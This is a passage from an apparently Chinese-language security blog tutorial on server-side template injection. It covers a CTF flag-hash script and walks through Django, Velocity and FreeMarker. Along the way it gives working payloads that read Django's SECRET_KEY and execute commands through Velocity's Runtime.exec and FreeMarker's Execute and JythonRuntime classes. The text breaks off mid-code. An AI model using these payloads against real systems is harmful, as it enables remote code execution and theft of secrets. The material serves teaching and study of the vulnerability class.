<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token builtin">hash</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>

filename<span class="token operator">=</span><span class="token string">'/fllllllllllllag'</span>
cookie_secret<span class="token operator">=</span><span class="token string">"faaff564-f1dd-429d-90b3-130ab49962ea"</span>
<span class="token builtin">hash</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span>filename<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
s1<span class="token operator">=</span><span class="token builtin">hash</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token builtin">hash</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token builtin">hash</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span>s1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到filehash=874955327dac355296226eb28f1b02b8，得到flag</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623192113538.png" alt="image-20230623192113538"></p>
<h2 id="九、Python-Django模板">九、Python-Django模板</h2>
<p>先看存在漏洞的代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    template <span class="token operator">=</span> <span class="token string">'Hello {user}, This is your email: '</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>GET<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'email'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> HttpResponse<span class="token punctuation">(</span>template<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>user<span class="token operator">=</span>request<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>很明显 email 就是注入点，但是条件被限制的很死，很难执行命令，现在拿到的只有有一个和user有关的变量request.user ，这个时候我们就应该在没有应用源码的情况下去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用。</p>
<p>后来发现Django自带的应用 “admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623192434487.png" alt="image-20230623192434487"></p>
<p>所以可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p>
<p>payload如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span>localhost<span class="token punctuation">:</span><span class="token number">8000</span><span class="token operator">/</span>?email<span class="token operator">=</span><span class="token punctuation">{</span>user<span class="token punctuation">.</span>groups<span class="token punctuation">.</span>model<span class="token punctuation">.</span>_meta<span class="token punctuation">.</span>app_config<span class="token punctuation">.</span>module<span class="token punctuation">.</span>admin<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>SECRET_KEY<span class="token punctuation">}</span>

http<span class="token punctuation">:</span><span class="token operator">//</span>localhost<span class="token punctuation">:</span><span class="token number">8000</span><span class="token operator">/</span>?email<span class="token operator">=</span><span class="token punctuation">{</span>user<span class="token punctuation">.</span>user_permissions<span class="token punctuation">.</span>model<span class="token punctuation">.</span>_meta<span class="token punctuation">.</span>app_config<span class="token punctuation">.</span>module<span class="token punctuation">.</span>admin<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>SECRET_KEY<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="十、Java-velocity模板">十、Java-velocity模板</h2>
<p>（以下板块参照自《<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8135#toc-2">CVE-2019-3396 Confluence Velocity SSTI漏洞浅析</a>》）</p>
<p>Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。</p>
<h3 id="1-基本语法">1. 基本语法</h3>
<p><strong>语句标识符</strong></p>
<p>#用来标识Velocity的脚本语句，包括#set、#if 、#else、#end、#foreach、#end、#include、#parse、#macro等语句。</p>
<p><strong>变量</strong></p>
<p>$用来标识一个变量，比如模板文件中为Hello $a，可以获取通过上下文传递的$a</p>
<p><strong>声明</strong></p>
<p>set用于声明Velocity脚本变量，变量可以在脚本中声明</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">#<span class="token function">set</span><span class="token punctuation">(</span>$a <span class="token operator">=</span><span class="token string">"velocity"</span><span class="token punctuation">)</span>
#<span class="token function">set</span><span class="token punctuation">(</span>$b<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
#<span class="token function">set</span><span class="token punctuation">(</span>$arrayName<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><strong>注释</strong></p>
<p>单行注释为##，多行注释为成对出现的#* … *#</p>
<p><strong>条件语句</strong></p>
<p>以if/else为例：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">#<span class="token keyword">if</span><span class="token punctuation">(</span>$foo<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">)</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>strong<span class="token punctuation">&gt;</span></span><span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>strong<span class="token operator">&gt;</span>
#<span class="token function">elseif</span><span class="token punctuation">(</span>$foo<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>strong<span class="token punctuation">&gt;</span></span><span class="token number">2</span><span class="token operator">&lt;</span><span class="token operator">/</span>strong<span class="token operator">&gt;</span>
#<span class="token function">elseif</span><span class="token punctuation">(</span>$bar<span class="token operator">==</span><span class="token number">6</span><span class="token punctuation">)</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>strong<span class="token punctuation">&gt;</span></span><span class="token number">3</span><span class="token operator">&lt;</span><span class="token operator">/</span>strong<span class="token operator">&gt;</span>
#<span class="token keyword">else</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>strong<span class="token punctuation">&gt;</span></span><span class="token number">4</span><span class="token operator">&lt;</span><span class="token operator">/</span>strong<span class="token operator">&gt;</span>
#end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>转义字符</strong></p>
<p>如果$a已经被定义，但是又需要原样输出$a，可以试用\转义作为关键的$</p>
<p><strong>基础使用</strong></p>
<p>使用Velocity主要流程为：</p>
<ul>
<li>初始化Velocity模板引擎，包括模板路径、加载类型等</li>
<li>创建用于存储预传递到模板文件的数据的上下文</li>
<li>选择具体的模板文件，传递数据完成渲染</li>
</ul>
<p>VelocityTest.java</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">Velocity</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>velocity<span class="token punctuation">.</span></span><span class="token class-name">Template</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>velocity<span class="token punctuation">.</span></span><span class="token class-name">VelocityContext</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>velocity<span class="token punctuation">.</span>app<span class="token punctuation">.</span></span><span class="token class-name">VelocityEngine</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">StringWriter</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">VelocityTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token class-name">VelocityEngine</span> velocityEngine <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VelocityEngine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        velocityEngine<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token class-name">VelocityEngine</span><span class="token punctuation">.</span><span class="token constant">RESOURCE_LOADER</span><span class="token punctuation">,</span> <span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        velocityEngine<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token class-name">VelocityEngine</span><span class="token punctuation">.</span><span class="token constant">FILE_RESOURCE_LOADER_PATH</span><span class="token punctuation">,</span> <span class="token string">"src/main/resources"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        velocityEngine<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token class-name">VelocityContext</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VelocityContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        context<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"Rai4over"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        context<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"project"</span><span class="token punctuation">,</span> <span class="token string">"Velocity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token class-name">Template</span> template <span class="token operator">=</span> velocityEngine<span class="token punctuation">.</span><span class="token function">getTemplate</span><span class="token punctuation">(</span><span class="token string">"test.vm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">StringWriter</span> sw <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> sw<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"final output:"</span> <span class="token operator">+</span> sw<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>模板文件：src/main/resources/test.vm</p>
<pre class="line-numbers language-none"><code class="language-none">Hello World! The first velocity demo.
Name is $name.
Project is $project<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>输出结果：</p>
<pre class="line-numbers language-none"><code class="language-none">final output:
Hello World! The first velocity demo.
Name is Victor Zhang.
Project is Velocity
java.lang.UNIXProcess@12f40c25<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过 VelocityEngine 创建模板引擎，接着 velocityEngine.setProperty 设置模板路径 src/main/resources、加载器类型为file，最后通过 velocityEngine.init() 完成引擎初始化。</p>
<p>通过 VelocityContext() 创建上下文变量，通过put添加模板中使用的变量到上下文。</p>
<p>通过 getTemplate 选择路径中具体的模板文件test.vm，创建 StringWriter 对象存储渲染结果，然后将上下文变量传入 template.merge 进行渲染。</p>
<p>比如：</p>
<p>这里使用java-sec-code里面的SSTI代码：</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623193412181.png" alt="image-20230623193412181"></p>
<p>poc：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//127.0.0.1:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor() //延迟了5秒</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623193517184.png" alt="image-20230623193517184"></p>
<p>参照《<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7466">白头搔更短，SSTI惹人心！</a>》简单进行调试</p>
<p>在最初的Controller层下断点，来追踪poc的解析过程：</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623193531234.png" alt="image-20230623193531234"></p>
<p>（template -&gt; instring）进入 Velocity.evaluate 方法：</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623193638336.png" alt="image-20230623193638336"></p>
<p>（instring -&gt; reader）继续跟进 evaluate 方法，RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623193803831.png" alt="image-20230623193803831"></p>
<p>跟进 StringReader 方法查看详情：</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623193902862.png" alt="image-20230623193902862"></p>
<p>（reader -&gt; nodeTree）继续跟进 this.evaluate() 方法</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623194043449.png" alt="image-20230623194043449"></p>
<p>（nodeTree -&gt; writer）继续跟进render方法</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623194149726.png" alt="image-20230623194149726"></p>
<p>emmm…继续跟进render</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623194211611.png" alt="image-20230623194211611"></p>
<p>继续看render方法</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623194233181.png" alt="image-20230623194233181"></p>
<p>跟进execute方法</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623194305241.png" alt="image-20230623194305241"></p>
<p>可以看到这是最后一步了，调试结束就可以看到poc已经成功被执行，看一下上图中的for循环的代码，大概意思是当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE</p>
<p><strong>Confluence 未授权RCE分析（CVE-2019-3396）</strong></p>
<p>根据官方文档的描述，可以看到这是由 widget Connector 这个插件造成的SSTI，利用SSTI而造成的RCE。在经过diff后，可以确定触发漏洞的关键点在于对post包中的_template字段</p>
<p>具体漏洞代码调试可以参考：《<a target="_blank" rel="noopener" href="https://caiqiqi.github.io/2019/11/03/Confluence%E6%9C%AA%E6%8E%88%E6%9D%83%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2019-3396/">Confluence未授权模板注入/代码执行(CVE-2019-3396)</a>》</p>
<p>《[Confluence 未授权RCE分析（CVE-2019-3396）](<a target="_blank" rel="noopener" href="https://lucifaer.com/2019/04/16/Confluence">https://lucifaer.com/2019/04/16/Confluence</a> 未授权RCE分析（CVE-2019-3396）/#0x01-漏洞概述)》</p>
<h2 id="十一、Java-FreeMarker">十一、Java-FreeMarker</h2>
<p>FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623194739724.png" alt="image-20230623194739724"></p>
<p><strong>FreeMarker模板代码</strong>：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Welcome!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>　<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#–这是注释–</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Welcome ${user}!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Our latest product:
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>${latestProduct.url}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>${latestProduct.name}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>!
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>模板文件存放在Web服务器上，就像通常存放静态HTML页面那样。当有人来访问这个页面， FreeMarker将会介入执行，然后动态转换模板，用最新的数据内容替换模板中 ${…} 的部分， 之后将结果发送到访问者的Web浏览器中。</p>
<p>这个模板主要用于 java ，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象</p>
<p>具体的高级内置函数定义参考《<a target="_blank" rel="noopener" href="https://freemarker.apache.org/docs/ref_builtins_expert.html">Seldom used and expert built-ins</a>》</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623194939538.png" alt="image-20230623194939538"></p>
<p>主要的用法如下：</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;＃ - 创建一个用户定义的指令，调用类的参数构造函数 - &gt;
&lt;#assign word_wrapp ="com.acmee.freemarker.WordWrapperDirective"?new（）&gt;
&lt;＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - &gt;
&lt;#assign word_wrapp_narrow ="com.acmee.freemarker.WordWrapperDirective"?new（40）&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>调用了构造函数创建了一个对象，那么这个 payload 中就是调用的 freemarker 的内置执行命令的对象 Execute</p>
<p>freemarker.template.utility 里面有个Execute类，这个类会执行它的参数，因此我们可以利用new函数新建一个Execute类，传输我们要执行的命令作为参数，从而构造远程命令执行漏洞。构造payload：</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;#assign value="freemarker.template.utility.Execute"?new()&gt;${value("calc.exe")}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>freemarker.template.utility 里面的JythonRuntime，可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;#assign value="freemarker.template.utility.JythonRuntime"?new()&gt;&lt;@value&gt;import os;os.system("calc.exe")&lt;/@value&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里使用测试代码来大概演示一下：<a target="_blank" rel="noopener" href="https://github.com/hellokoding/springboot-freemarker">https://github.com/hellokoding/springboot-freemarker</a></p>
<p>代码演示说明：<a target="_blank" rel="noopener" href="https://hellokoding.com/spring-boot/freemarker/">https://hellokoding.com/spring-boot/freemarker/</a></p>
<p><strong>前端代码　　——&gt;　　hello.ftl</strong></p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Hello ${name}!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/css/main.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hello-title<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Hello ${name}!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/js/main.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>后端代码　　——&gt;　　HelloController.java：</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>backendvulnerabilities<span class="token punctuation">.</span>ssti</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">freemarker<span class="token punctuation">.</span>cache<span class="token punctuation">.</span></span><span class="token class-name">MultiTemplateLoader</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">freemarker<span class="token punctuation">.</span>cache<span class="token punctuation">.</span></span><span class="token class-name">StringTemplateLoader</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">freemarker<span class="token punctuation">.</span>cache<span class="token punctuation">.</span></span><span class="token class-name">TemplateLoader</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">freemarker<span class="token punctuation">.</span>template<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">freemarker<span class="token punctuation">.</span>template<span class="token punctuation">.</span></span><span class="token class-name">Template</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">freemarker<span class="token punctuation">.</span>template<span class="token punctuation">.</span></span><span class="token class-name">TemplateException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">freemarker<span class="token punctuation">.</span>template<span class="token punctuation">.</span>utility<span class="token punctuation">.</span></span><span class="token class-name">DateUtil</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>ui<span class="token punctuation">.</span></span><span class="token class-name">Model</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">StringWriter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Controller</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloController</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span>  <span class="token class-name">Configuration</span> con<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/hello"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> body<span class="token punctuation">,</span> <span class="token class-name">Model</span> model<span class="token punctuation">)</span> <span class="token punctuation">{</span>
